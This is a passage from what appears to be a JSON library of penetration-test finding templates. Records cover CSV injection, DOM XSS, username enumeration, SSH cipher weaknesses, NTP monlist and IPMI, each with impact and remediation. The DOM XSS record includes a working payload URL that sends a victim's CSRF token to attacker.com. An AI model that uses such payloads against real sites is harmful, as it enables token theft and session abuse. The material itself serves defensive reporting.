documents (e.g. .csv or .xls) containing untrusted user-supplied data. Many modern spreadsheet programs such as Microsoft Excel and LibreOffice can interpret cell-level syntax consisting of an equal sign followed by a function name or an expression. Untrusted data inserted into spreadsheet data fields containing such syntax may be interpreted as formulas by a recipient's spreadsheet program and execute on the recipient's system.\n","poc":null,"impact":"An attacker may inject functions or expressions that alter an affected spreadsheet's content to trick a victim into believing that the modified spreadsheet content is genuine. The impact of altering this data is contingent on what data is present in the document, but the overall goal would be to influence a victim's actions based on the modified data (e.g. altering market data to influence a victim's financial decisions).\nAdditionally, an attacker may inject functions such as the =HYPERLINK(...) function to trick the victim into navigating to an attacker-controlled site or launching an executable on their local system, potentially leading to information leakage or complete system compromise.\n","remediation":"Escape all untrusted input before inserting it into spreadsheet data fields. In Microsoft Excel, this is accomplished by placing a single-quote before the content. For example, the following string will be treated as plain text rather than a formula: '=HYPERLINK(...)\n","cvss_base_score":7,"cvss_temporal_score":5.8,"cvss_vector":"(AV:N/AC:M/Au:S/C:N/I:C/A:P/E:F/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":620,"plugin_id":null,"title":"DOM-Based Cross-Site Scripting","type":null,"description":"DOM-based cross-site scripting (XSS) is a client-side injection issue where an attacker inserts a malicious script into the Document Object Model (DOM) modifying application's behavior. The DOM is a standardized programming interface that enables applications and scripts to dynamically update the structure, content, and layout of a web page.\nIn a DOM-based XSS scenario, the attacker sends malicious strings to a victim's browser in such a way that the browser executes part of the string as code. The main difference between DOM-based and traditional, server-side XSS is that in a DOM-based XSS attack the payload (malicious string) is injected during runtime by the client, while in a traditional XSS it is injected into the application response during server-side processing and then sent to the browser.\nThis vulnerability manifests itself throughout many different contexts. The application uses untrusted input in JavaScript methods and attributes that render HTML, such as:\n--element.innerHTML - a property that sets or gets the HTML syntax describing the element's descendants.\n--element.outerHTML - a property that sets or gets the HTML fragment describing the element and its descendants.\n\n--eval - a function that evaluates its argument as JavaScript code.\n--setTimeOut - a function that evaluates a string after a specified number of milliseconds.\n--setInterval - a function that evaluates a string every specified number of milliseconds.\n--new Function - a constructor that creates JavaScript functions dynamically.\n--setAttribute - a function that sets an attribute on the specified element.\n--document.write and document.writeln - functions that write a string to a document. The string may contain HTML tags, as well as a \n--any event handler, as they execute JavaScript.\n\n--document.location - returns an object that contains information from the URI. The object also has methods for changing the URI or loading another URI for browser redirection.\n--document.url - retrieves the URI as a string.\n--document.referer - returns the URI that linked to the current page.\n\n<pre><p><b id='err'></b></p> <input type=hidden id=_csrf value=\"wS2sCg7DA0\" /> <script>document.getElementById('err').innerHTML = window.location.hash.substring(1);</script> </pre>\nIn a normal use case, a user fetches the page with a URL such as:\n<pre><code class=\"\">https://example.com/updateItems.html#Item unavailable </pre>\nNote that the browser does not send the fragment identifier to the server.\nAn attacker can execute a DOM-based XSS attack against this page by sending the following URL to a victim:\n<pre><code class=\"\">https://example.com/updateItems.html#<svg/onload='document.write(\"<img src=http://attacker.com/listentodata?token=\"+document.getElementById(\"_csrf\").value+\" /></img>\")'> </pre>\nIn this case, the JavaScript code on the page adds the SVG tag to the 'err' element via the innerHTML property. Once the SVG tag is added, its 'onload' method is called. That method executes the event handler which writes an image tag to the page with the source attribute set to an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive data from the victim's page, such as the value of the CSRF token stored in the element with the \"_csrf\" id. The element added to the page will look like the following. <pre><code class=\"\"><img src=\"http://attacker.com/listentodata?token=wS2sCg7DA0\"> </pre>\nWhen the browser adds the image tag, it tries to fetch the image from the provided URL. Therefore, the attacker's website receives a request exposing the victim's CSRF token in a GET parameter.\n","poc":null,"impact":"Like in traditional XSS vulnerabilities, an attacker can steal any sensitive information from the page, arbitrarily alter the page content, and execute application functions using the victim's identity if the victim is authenticated to the application.\n","remediation":"Use the correct remediation approach depending on the JavaScript execution context. Similar to traditional XSS mitigations, DOM-based XSS is mitigated using output encoding and input validation. Output encoding technique should match the JavaScript execution context, such as HTML, HTML attribute, URL, etc. Contrary to the traditional XSS mitigation, in DOM-based XSS, some contexts cannot be mitigated with output encoding and, therefore, require input validation. In all cases, the mitigation must be done in the client-side code. \nDifferent mitigation techniques apply to different JavaScript execution contexts:\n--HTML context. Use the correct element property, such as textContent, innerText or outerText, so that the inserted data is automatically output-encoded by the browser. \n--HTML attributes. When the setAttribute() function is used with untrusted data in both the name of the attribute and its value, use exact match to limit the attribute names that a user can set. These should only be safe attributes that do not execute JavaScript, such as 'align', 'alink', 'alt', 'value' and not event handlers or URI-type attributes. When untrusted data is used to set the value of the attribute, make sure that the attribute is not an event handler or a source. In addition, use input validation for the attribute's values, where appropriate (for example, for numeric values, such as 'width', 'height').\n--URL context. Use the exact match approach or mapping. If the application must allow users to provide any URL, at the minimum, validate the schema of the URL to avoid XSS through redirects to 'javascript:' and 'data:' URLs. \n--JavaScript context. Redesign the application so untrusted data is not used to dynamically create or modify JavaScript code. If redesign is not possible, use exact match or whitelisting, since JavaScript encoding will not mitigate an injection into a string that is dynamically evaluated by functions like eval(), new Function(), document.write(), or an event handler. \n\nFor example, if untrusted data passed through the URL fragment must be added to the page, use the innerText property rather than innerHTML. In this case, if the data contains any HTML tags, they will be automatically encoded by the browser.\n<pre><p><b id='err'></b></p> <input type=hidden id=_csrf value=\"wS2sCg7DA0\" /> <script>document.getElementById('err').innerText = window.location.hash.substring(1);</script> </pre>\n","cvss_base_score":6.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:C/A:P)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":621,"plugin_id":null,"title":"Application Screenshot Information Disclosure (iOS)","type":null,"description":"The application allows disclosure of sensitive information via automatically created screenshots. By default, the iOS operating system takes a screenshot of each application as it enters the background state in order to improve the user experience. The resulting image is stored as an UIApplicationAutomaticSnapshot on the device until the application is fully closed or the device is restarted. Any sensitive data that is present on the screen immediately prior to the transition to background gets stored to the device in the screenshot image.\nAn attacker with physical access to the device could obtain the image and scrape sensitive data from it. While only a single image would be available to the attacker, it may contain data that was visible during any portion of the application's lifecycle.","poc":"","impact":"","remediation":"Prevent the application from entering a background state or mask sensitive UI data proactively before backgrounding. If the application will never need to run in the background, modify the application's Info.plist file by adding the UIApplicationExitsOnSuspend key with a value of \"YES\" to cause it to close completely and never run in the background. This should prevent the possibility of information disclosure via automatic screenshots. This solution also mitigates the risk of sensitive information being read from process memory while the application is in the background. If there is a need for the application to run in the background, implement functionality within your application delegate's applicationDidEnterBackground method to mask the views that contain sensitive information with an alternative view that does not contain anything sensitive (such as replacing the view with a custom logo or black screen). The applicationDidEnterBackground method is triggered by the operating system just before the application enters the background state and before the automatic screenshot is taken.","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2019-01-16 06:16:33","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":"","likelihood_text":""},{"id":622,"plugin_id":null,"title":"Login Page Username Enumeration","type":null,"description":"The application's login functionality returns different responses depending on whether the entered username is valid or not. The difference in responses may be as straightforward as \"Invalid password\" versus \"User [username] does not exist\". Responses may also be more subtle. The application may return a generic failed login message that differs slightly depending on whether a valid username and invalid password is supplied versus an invalid username, or the application may display a single error message, but some other (potentially non-visible) aspect of the response's content is different.\nAn attacker can abuse this design to compile a list of valid users through automated brute force guessing attempts. Simple scripts can be found or written that automatically guess usernames by submitting them to the login function with a dummy password and observing the server's responses.\n","poc":null,"impact":"Username enumeration provides an attacker with one of two pieces of information required to authenticate to the application. By automating guesses, an attacker is able to retrieve a large list of valid usernames for an application. Once the attacker has a list of valid usernames, they can begin guessing passwords in an attempt to steal credentials and impersonate other users. Password guessing attempts may be done manually, or via automated means depending on what login anti-automation mechanisms (if any) the application has in place. Valid usernames may also be used in phishing exercises as well as large-scale account lockout denial of service attacks.\n","remediation":"The application should return the same response whether or not the supplied username is associated with a valid account. An example response for all combinations of invalid credentials could be, \"The username and password entered do not match.\"\n","cvss_base_score":5.8,"cvss_temporal_score":4.8,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:N/A:P/E:F/RL:OF/RC:C/CDP:L/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":623,"plugin_id":null,"title":"HTTP Parameter Pollution","type":null,"description":"HTTP parameter pollution (HPP) occurs when an application interprets the values of duplicate HTTP request parameters in unexpected ways. The current HTTP standard does not provide any information on how duplicate parameters should be handled, which allows clients to submit requests containing duplicates of the same parameter without causing an error. These extra parameters are sent to the server as a means to \"pollute\" the request, in an attempt to bypass application protections. Note that an HPP attack can affect both client side and server side components.\nConsider the following URL that uses two query string parameters to accept a user's first and last name, which will be sent to the server:\n<pre>http://example.com/test?FirstName=Value1&LastName=Value2 </pre>\nThe application interprets these two parameters as separate entities containing their own values; \"FirstName\" will be mapped to the value \"Value 1\", and \"LastName\" will map to the value \"Value2\". Now consider the same URL with the parameter \"FirstName\" included twice, with two different values:\n<pre>http://example.com/test?FirstName=Value1&LastName=Value2&FirstName=Value3    </pre>\nThe manner in which duplicate parameters are parsed depends on the web technology and web server in use. Consider the following examples:\n--ASP.NET in IIS: the values from all duplicate parameters are concatenated, separated by a comma\n--PHP in Apache: only the last value is taken from a set of duplicate parameters\n--Perl CGI in Apache: only the first value is taken from a set of duplicate parameters\n\n","poc":null,"impact":"The consequence of exploiting HTTP parameter pollution depends on the web/backend technology in use, and the functionality present in the vulnerable application. A common client-side attack involves an attacker tricking a victim into submitting a request and forcing the server to accept attacker-controlled parameter values. First, the attacker tricks a victim into navigating to a URL with a query string parameter set to a value the attacker supplies. The application then serves the victim a page containing links constructed by appending duplicates of the attacker-controlled parameters to the existing URL. If the victim follows one of these links, the application may then honor the attacker's parameter value rather than the value appended by the application. The impact of this attack is limited only to the application's functionality. For example, an attacker able to control values submitted to administration functionality may be able to create new users or modify existing ones in an attempt to gain access to the application.\nIn addition to targeted attacks, parameter pollution may be used to override static parameter values or bypass server-side input validation, by forcing the application server to use the value taken from the last instance of a set of duplicate parameters in the HTTP request. Submitting duplicate parameters in HTTP requests may also trigger verbose error messages. Verbose error messages may reveal details about the application and server that aid the attacker in developing more effective attacks against the system.\n","remediation":"Implement context-sensitive input validation for all parameters received by the application. As HTTP parameter pollution can affect a target system in a variety of ways, filters must consider the request's context, associated business logic, and technology stack to derive an effective filter. In scenarios where the application is rewriting constructed URLs entirely or partially using user-supplied input, validate untrusted input to ensure that duplicates of parameters are not being appended to URLs.\n","cvss_base_score":6.4,"cvss_temporal_score":4.7,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:P/A:P/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":624,"plugin_id":null,"title":"Flash Parameter allowScriptAccess Set to Always","type":null,"description":"The \"allowScriptAccess\" parameter is set to \"always\" for SWF files embedded in application HTML pages, allowing those SWFs to access the HTML page's DOM regardless of their origin. The \"allowScriptAccess\" parameter determines whether a flash object (SWF file) is allowed to perform outbound scripting and URL access depending on whether the SWF is hosted on the same domain or on an external domain. This parameter can be set to one of three values: \"never\", \"sameDomain\", and \"always\". When set to \"always\", the SWF can access the HTML DOM, which includes data such as session cookies, regardless of the SWF's host domain.\nThe following sample code shows an HTML block with an embedded flash object whose \"allowScriptAccess\" parameter is set to \"always\":\n<pre><object type=\"application/x-shockwave-flash\" data=\"movie.swf\" id=\"swfObj1\">   <param name=\"movie\" value=\"movie.swf\">   <param name=\"allowScriptAccess\" value=\"always\">   ... </object> </pre>\nWith the parameter \"allowScriptAccess\" set to \"always\", the SWF file can send data to the HTML page it is embedded in, potentially allowing it to inject a malicious script or execute a cross-domain privilege escalation.\n","poc":null,"impact":"With the \"allowScriptAccess\" parameter to \"always\", malicious third-party SWFs embedded in pages served to legitimate users will have access to the HTML DOM. An attacker can exploit this to inject malicious scripts into response pages that arbitrarily alter page content displayed to the victim and execute application functionality using the victim's identity. This can also result in cross-domain privilege escalation, as a remote attacker could leverage this vulnerability to bypass authorization controls to access content from the target domain.\n","remediation":"The \"allowScriptAccess\" parameter should be set to \"never\" to prevent third-party SWFs from accessing the HTML page they are embedded in. If such functionality is necessary for legitimate application functionality, the parameter value should be set to \"sameDomain\". The \"sameDomain\" value restricts communication between the SWF file and the HTML page to SWF files that are hosted on the same domain. Note the parameter can also be removed from the code, as it defaults to \"sameDomain\".\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":625,"plugin_id":null,"title":"Apache MultiViews Attack","type":null,"description":"The Apache \"multiviews\" feature is enabled on the web server. When this feature is enabled, Apache responds with different representations of a resource depending on the MIME-type specified in the request's \"Accept\" header. For example, take the following request for the resource \"Test\", with no file extension supplied:\n<pre>GET /webroot/Test HTTP/1.1 Host: 127.0.0.1 Accept: text/html </pre>\nWith multiviews enabled in the \"webroot\" directory, the application will attempt to return a valid resource that matches the name provided in the request (e.g. \"Test\"), as well as the file type specified in the \"Accept\" header (e.g. \"text/html\"). In this example, if the directory contained \"Test.html\" and \"Test.jpeg\", the \"Test.html\" page would be returned since the file type matches the request.\nIn instances where no files in a directory match the requested type, Apache will return a list of all possible matches. This can be abused by submitting requests to the target server with an invalid value in the \"Accept\" header to return all possible options for the file name. For example, the following request once again tries to access a resource named \"Test\", but uses an improper value for the \"Accept\" header:\n<pre>GET /webroot/Test HTTP/1.1 Host: 127.0.0.1 Accept: text/VOID </pre>\nSince no files exist that match the name and file type requested, the following response is returned with a list of all files called \"Test\", regardless of their file type.\n<pre>HTTP/1.1 300 Multiple Choices Date: Sat, 30 Aug 2016 11:30:23 GMT Alternates: {\"Test.html\" 1 {type text/html} {length 100}},  {\"Test.txt\" 1 {type text/plain} {length 100}},  {\"Test.jpeg\" 1 {type image/jpeg} {length 1000}},  {\"Test.7z\" 1 {type application/x-7z-compressed} {length 50}},  {\"Test.exe\" 1 {type application/x-msdownload} {length 2000}} </pre>\n","poc":null,"impact":"The Apache multiviews feature provides an attacker with a means to locate files, application pages and other resources on the web server more efficiently than would otherwise be possible. If discovered resources are not properly protected by authentication and/or authorization, the attacker may gain access to sensitive data (e.g. via exported or archive files) and application functionality (e.g. via test scripts and unlisted application pages). Revealing all possible resource types may also reveal information about the application's technology stack that can be used to create and execute more targeted attacks.\n","remediation":"The multiviews option must be disabled for all directories in Apache's configuration files, (e.g. httpd.conf or .htaccess). As multiviews is not enabled by default, any instance of \"MultiViews\" being set by the Options directive must be removed. The use of multiviews can also be explicitly denied by setting \"-MultiViews\" in the directory options.\n","cvss_base_score":2.6,"cvss_temporal_score":1.9,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:N/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":626,"plugin_id":null,"title":"SSH Server CBC Mode Ciphers Enabled","type":null,"description":"The SSH server located on the remote host allows cipher block chaining (CBC) ciphers to be used to establish a Secure Shell (SSH) connection, leaving encrypted content vulnerable to a plaintext recovery attack. SSH is a cryptographic network protocol that allows encrypted connections between machines to be established. These connections can be used for remote login by an end user, or to encrypt network services. SSH leverages various encryption algorithms to make these connections, including ciphers that employ cipher block chaining.\nThe plaintext recovery attack can return up to thirty two bits of plaintext with a probability of 2-18 or fourteen bits of plain text with a probability of 2-14. This exposure is caused by the way CBC ciphers verify the message authentication code (MAC) for a block. Each block's MAC is created by a combination of an unencrypted sequence number and an encrypted section containing the packet length, padding length, payload, and padding. With the length of the message encrypted the receiver of the packet needs to decrypt the first block of the message in order to obtain the length of the message to know how much data to read. As the location of the message length is static among all messages, the first four bytes will always be decrypted by a recipient. An attacker can take advantage of this by submitting an encrypted block, one byte at a time, directly to a waiting recipient. The recipient will automatically decrypt the first four bytes received as it the length is required to process the message's MAC. Bytes controlled by an attacker can then be submitted until a MAC error is encountered, which will close the connection. Note as this attack will lead to the SSH connection to be closed, iterative attacks of this nature will be difficult to carry out against a target system.\n","poc":null,"impact":"Establishing an SSH connection using CBC mode ciphers can result in the exposure of plaintext messages, which are derived from an encrypted SSH connection. Depending on the data being transmitted, an attacker may be able to recover session identifiers, passwords, and any other data passed between the client and server.\n","remediation":"All CBC mode ciphers should be disabled on the target SSH server. In the place of CBC, SSH connections should be created using ciphers that utilize CTR (Counter) mode or GCM (Galois/Counter Mode), which are resistant to the plaintext recovery attack.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":627,"plugin_id":null,"title":"SSH Weak MAC Algorithms Enabled","type":null,"description":"The SSH server is configured to allow cipher suites that include weak message authentication code (\"MAC\") algorithms. Examples of weak MAC algorithms include MD5 and other known-weak hashes, and/or the use of 96-bit or shorter keys. The SSH protocol uses a MAC to ensure message integrity by hashing the encrypted message, and then sending both the message and the output of the MAC hash function to the recipient. The recipient then generates their hash of the message and related content and compares it to the received hash value. If the values match, there is a reasonable guarantee that the message is received \"as is\" and has not been tampered with in transit.\n","poc":null,"impact":"If the SSH server is configured to accept weak or otherwise vulnerable MAC algorithms, an attacker may be able to crack them in a reasonable timeframe. This has two potential effects:\n--The attacker may figure out the shared secret between the client and the server thereby allowing them to read sensitive data being exchanged.\n--The attacker may be able to tamper with the data in-transit by injecting their own packets or modifying existing packet data sent within the SSH stream.\n\n","remediation":"Disable all 96-bit HMAC algorithms, MD5-based HMAC algorithms, and all CBC mode ciphers configured for SSH on the server. The sshd_config file should only contain the following options as far as supported MAC algorithms are concerned:\n--hmac-sha2-512\n--hmac-sha2-512-etm@openssh.com\n--hmac-sha2-256\n--hmac-sha2-256-etm@openssh.com\n--hmac-ripemd160-etm@openssh.com\n--umac-128-etm@openssh.com\n--umac-128-etm@openssh.com\n--hmac-ripemd160\n--umac-128@openssh.com\n--umac-128@openssh.com\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":628,"plugin_id":null,"title":"SNMP Default Community Name","type":null,"description":"Users can successfully authenticate to the SNMP service running on the remote server using easily-guessable default credentials. A device can use the Simple Network Management Protocol (SNMP), typically found on UDP 161, to expose information about itself. One common use case for SNMP is a tool that automatically queries devices for health-checking purposes, and alerting administrators when variables cross predetermined thresholds.\nSNMP versions prior to 3 rely solely on \"Community Strings\" for authentication. This string is sent across the network in plaintext, and devices are often configured with default community strings such as 'public', 'private', or 'cisco'.\n","poc":null,"impact":"The impact of this misconfiguration varies depending on the permissions of the compromised account and the device's function. At a minimum, the attacker would typically gain access to internal system information such as open ports and exact version numbers. However, if the compromised account has write access, the attacker would be able to reconfigure the device.\n","remediation":"Disable SNMP, or use a hardened SNMPv3-only configuration. If SNMPv2 must be used, change the community string to a non-standard and not easily guessable format.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":629,"plugin_id":null,"title":"Apache Web Server Vulnerable Version in Use","type":null,"description":"The version of Apache web server (often referred to simply as \"Apache\") running on the remote server contains known vulnerabilities.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in Apache vary depending on the version of Apache deployed. Known vulnerabilities include common web application vulnerabilities such as cross-site scripting and SQL injection in default pages, as well as more complex vulnerabilities in the Apache web server and related packages that may allow denial of service, privilege escalation, sensitive information disclosure, and others.\nFor the latest list of CVE's open against Apache web server, select the deployed version of Apache from the version list on the following page:  https://www.cvedetails.com/version-list/45/66/1/Apache-Http-Server.html\n","remediation":"Upgrade to the latest version of Apache and all installed modules. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":630,"plugin_id":null,"title":"NTP Monlist Enabled","type":null,"description":"The \"monlist\" command is enabled on the remote server via the ntpd service. The NTP service provides a monitoring feature for administrators to query the NTP server for a list of recently connected hosts. This is achieved through the \"monlist\" command that by default returns a list of the last 600 hosts that have connected to the server.\n","poc":null,"impact":"Since NTP servers operate over UDP, attackers can easily spoof source IP addresses. Combined with the fact that the \"monlist\" command returns an amplified response for each source IP address, attackers can greatly increase their overall bandwidth usage in order to execute distributed denial of service attacks. This is accomplished by tricking each NTP server into overwhelming a specific host on the network. Due to the large amplification in returned data, only a relatively few misconfigured servers are needed to cause a noticeable impact on the victim's network. Also note that since anyone can issue a \"monlist\" command, unauthenticated attackers can exploit this vulnerability.\n","remediation":"The \"monlist\" command is enabled by default in all versions of the ntp service prior to 4.2.7 and hence are vulnerable to this attack; upgrade to the latest version of the ntp server packages, where the \"monlist\" function is disabled by default. For older versions, disable the monlist command in the system's ntp.conf file by adding following commands:\nIPV4: restrict default limited kod nomodify notrap nopeer noquery\nIPv6: restrict -6 default limited kod nomodify notrap nopeer noquery\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":631,"plugin_id":null,"title":"IPMI Cipher Suite Zero Authentication Bypass","type":null,"description":"The Intelligent Platform Management Interface (IPMI) service has cipher suite zero enabled, allowing anonymous users to authenticate and administer the remote system. IPMI is a technology that allows administrators to remotely manage a computer separately from its normal operating hardware. Typically there is a separate physical port that an Ethernet cable connects to. Since this port is used exclusively for administration, it should only be reachable from administration networks.\nThe IPMI protocol uses cipher suites that determine which authentication and cryptographic algorithms are used to authenticate a user. With cipher suite zero enabled, a user can anonymously authenticate and administer the vulnerable system.\n","poc":null,"impact":"An attacker who has access to the remote system via IPMI has complete control over that system. Modern IPMI implementations include KVM functionality to control the keyboard, monitor, and mouse remotely. Once anonymously authenticated, the attacker can continue to administer the system even with the primary operating system powered down.\n","remediation":"IPMI cipher suite zero should be disabled, and the IPMI port should be moved to a management VLAN.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":632,"plugin_id":null,"title":"Help Pages Accessible To Unauthenticated Users","type":null,"description":"Help pages within the application are available to unauthenticated users. Application help pages may contain detailed descriptions of application functionality, as well as the proper workflows to use them. In addition to information regarding the functionality of the application these pages may also contain sensitive information that should only be accessible internally to the organization, such as employee contact information.\n","poc":null,"impact":"Help pages that are accessible to unauthenticated users can reveal sensitive information regarding application functionality and potentially expose employee personally identifiable information. Attackers can leverage the information in such help pages to perform reconnaissance against the application and create focused attacks.\n","remediation":"Access to help pages and help functionality should be available only to authorized users. The application should force users to login before granting access to help pages. Any unauthorized attempts should be redirected to the login page for authentication. Any sensitive data or personally identifiable information should also be removed from publicly accessible help pages.\n","cvss_base_score":5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"High","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":633,"plugin_id":null,"title":"Sensitive Data Logged to System Logs (iOS)","type":null,"description":"Sensitive data is written to the device's system logs. The system log, or syslog, can contain a wide variety of data ranging from application errors to general information regarding the runtime processes of the application.\nData is commonly sent to the system log through the use of the \"NSLog\" command. All data saved to the system log through this function will be world readable on a jail broken device. The logs themselves can be accessed in multiple ways on the device. Logs can be accessed directly on a device by locating the file \"/var/log/syslog\". The directory can be accessed via a direct SSH connection or a third party application that provides access to the file system. Logs may also be viewed on a local machine when a device is connected through standard functionality provided by Xcode or third party programs.\n","poc":null,"impact":"Sensitive data written to system logs may expose sensitive information, application logic, and users' personally identifiable information. An attacker that gains access to the information stored in the system log may gain better insight into the application's design, aiding in the reverse engineering of the application.\n","remediation":"Sensitive information (including data which relates to the internal process of the application and end user data), should not be logged to the system log. Application logs should contain limited information regarding the application and be generic in nature. No information should be stored in the system logs that an end user cannot directly utilize. If detailed logging is required in the application they should be included in \"DEBUG\" macros.\nOne approach is simply to create and use a macro which means that NSLog is only used in DEBUG builds. This approach is shown below:\n<pre><code class=\"csharp\">#ifdef DEBUG #   define NSLog(...) NSLog(__VA_ARGS__) #else  #   define NSLog(...) #endif </pre>\nAlternatively, if some logging in production (release) builds is desired then the following macro can be used:\n<pre><code class=\"csharp\">#ifdef DEBUG #   define DebugLog(...) NSLog(__VA_ARGS__) #else  #   define DebugLog(...) #endif </pre>\nThe development team can then use the DebugLog() macro for all logging instances which should only be included in DEBUG builds and continue to use NSLog for standard logging behavior. This approach should be used with caution to ensure that sensitive information is not accidentally leaked via NSLog.\n","cvss_base_score":4.9,"cvss_temporal_score":4.1,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:N/A:N/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":634,"plugin_id":null,"title":"SSL/TLS Logjam Information Leakage","type":null,"description":"The server's SSL/TLS termination point utilizes weak Diffie-Hellman (DH) keys for some of its cipher suites. DH keys that are 1024 bits (or shorter) expose the server to the Logjam vulnerability against the TLS protocol. The Logjam vulnerability exists due to a flaw in the SSL/TLS protocol rather than an implementation flaw. This vulnerability allows affected SSL/TLS connections to be downgraded to 512-bit export-grade cryptography.\nThe Logjam vulnerability can be exploited by performing the following steps:\n--The client connects to the server and offers at least one DHE cipher without offering any DHE_EXPORT ciphers in its ClientHello message.\n--The attacker who is sitting between the client and the server tampers with the client's connection request and only offers DHE_EXPORT ciphers to the server.\n--The server ends up selecting a DHE_EXPORT cipher.\n--The man-in-the-middle attacker then tampers with the server's response so that it looks like the server has selected a non-export DHE cipher to the client.\n--The server ends up sending export grade (i.e. weak) DH 